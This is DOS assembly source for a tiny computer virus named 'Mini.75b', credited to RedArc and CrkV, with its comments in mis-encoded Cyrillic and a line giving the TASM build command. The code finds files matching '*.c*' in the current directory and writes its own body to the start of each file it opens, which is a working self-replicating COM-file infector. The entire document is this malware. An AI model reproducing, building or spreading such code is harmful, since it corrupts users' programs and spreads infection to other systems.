; ���� Mini (c) by RedArc

; Mini.75b (c) CrkV

;� ���� � ����஢���� COM-䠩��� � ⥪�饬 ��⠫���
;� ����஢���� � ��砫�
;� ��⠢��� �ணࠬ�� ࠡ��ᯮᮡ�묨
;� �� ��ࠦ��� ����୮ 㦥 ����஢���� �ணࠬ��
;� ����� DTA
;� �� १������

;� ����� ��砫�� ���祭�� ॣ���஢

;use tasm mini_75b /m2

Model Tiny
.code
org 100h
start:
	Inc	Dh
	Mov	Es,Dx
	
	Mov	Ah,26h
	Int	21h
	
	Mov	Di,Si
	
	Mov	Si,VirLength+100h
	Push	Es Di Cs
	Pop	Cx
	Repe	MovSB
	Mov	Dx,Offset FileMask
	Mov	Ah,4Eh

@0:
	Int	21h
	Jnc	@1
	RetF
@1:
	Mov	Ax,3D02h
	Mov	Dx,9Eh
	Int	21h
	Xchg	Bx,Ax
	Mov	Ah,3Fh
	Mov	Dx,VirLength+100h
	Mov	Cx,Sp
	Int	21h
	Add	Ax,Virlength
	Push	Ax
	Sub	Cx,Cx
	Mul	Cx
	Mov	Ah,42h
	Int	21h
	Pop	Cx
	Mov	Ah,40h
	Pop	Dx
	Push	Dx
	Int	21h
@2:	Mov	Ah,4Fh
	Jmp	Short @0

FileMask db '*.c*', 0h
VirLength equ $-start
	Ret
end start
